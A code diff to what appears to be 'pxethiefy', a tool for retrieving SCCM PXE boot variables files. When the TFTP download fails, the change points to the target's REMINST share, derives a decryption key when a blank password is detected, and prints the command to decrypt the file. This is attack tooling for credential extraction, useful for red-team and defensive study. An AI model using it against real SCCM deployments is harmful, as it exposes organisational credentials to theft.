@@ -35,8 +35,15 @@ tftp_client = tftp.TFTPClient(args.target, 69, client)
 data_variables = tftp_client.get_file(variables)
 
 if data_variables is None:
-    print("[!] TFTP download failed")
-    print(f"[*] Download the variables file manually from: \\\\{args.target}\\REMINST{variables}")
+    print("[!] TFTP download failed — file must be retrieved manually")
+    print(f"[*] Download the variables file from: \\\\{args.target}\\REMINST{variables}")
+    if cryptokey is not None:
+        decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
+        if decrypt_password:
+            print(f"[*] Blank password detected — derived key: {decrypt_password.hex()}")
+            print(f"[*] Decrypt with: python3 pxethiefy.py decrypt -p {decrypt_password.hex()} -f <variables_file>")
+    else:
+        print("[*] Decrypt with: python3 pxethiefy.py decrypt -p PASSWORD -f <variables_file>")
     exit()
 
 if cryptokey == None:
